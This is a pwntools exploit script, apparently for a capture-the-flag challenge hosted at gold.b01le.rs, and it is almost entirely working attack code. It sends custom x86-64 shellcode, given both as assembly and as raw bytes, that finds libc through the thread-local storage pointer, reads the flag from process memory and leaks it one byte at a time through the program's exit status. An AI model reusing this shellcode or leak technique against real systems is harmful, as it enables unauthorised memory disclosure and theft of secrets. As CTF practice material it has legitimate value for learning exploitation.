#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./sym_z2h.386", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4005"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}

sc = """
    mov rsi, fs:[0x0]
    mov bl, 0x8
    neg rbx
    mov r15, QWORD PTR [rsi + rbx * 0x8]
    sub r15, 0x1ecb80
    mov r14, r15
    mov r14, QWORD PTR [r14 + 0x1ebf48]
    sub r14, 0x4060
    mov rsi, r14
    add rsi, 0x4080
    add rsi, 0xff
    xor rax, rax
    lodsb
    mov rdi, rax
    mov al, 0x3c
    syscall
"""

sc = b"\x64\x48\x8B\x34\x25\x00\x00\x00\x00"
sc += b"\xB3\x08\x48\xF7\xDB\x4C\x8B\x3C\xDE\x49\x81\xEF\x80\xCB\x1E\x00\x4D\x89\xFE\x4D\x8B\xB6\x48\xBF\x1E\x00\x49\x81\xEE\x60\x40\x00\x00\x4C\x89\xF6\x48\x81\xC6\x80\x40\x00\x00\x48\x81\xC6\xFF\x00\x00\x00\x48\x31\xC0\xAC\x48\x89\xC7\xB0\x3C\x0F\x05"
sc = b"\x00" * 0x4 + sc
idx_off = sc.index(b"\x48\x81\xC6\xFF\x00\x00\x00") + 3
payload = bytearray(sc)

flag = ""
with log.progress("enumerating") as prog:
    for i in range(0x64):
        payload[idx_off] = i

        with context.quiet:
            io = start()

        io.sendlineafter(b"input: ", payload.hex().encode())
        io.recvuntil(b"return value: ")
        leak = int(io.recvline())

        with context.quiet:
            io.close()
        if leak == 0:
            break
        flag += (chr(leak))
        prog.status(flag)

print(flag)
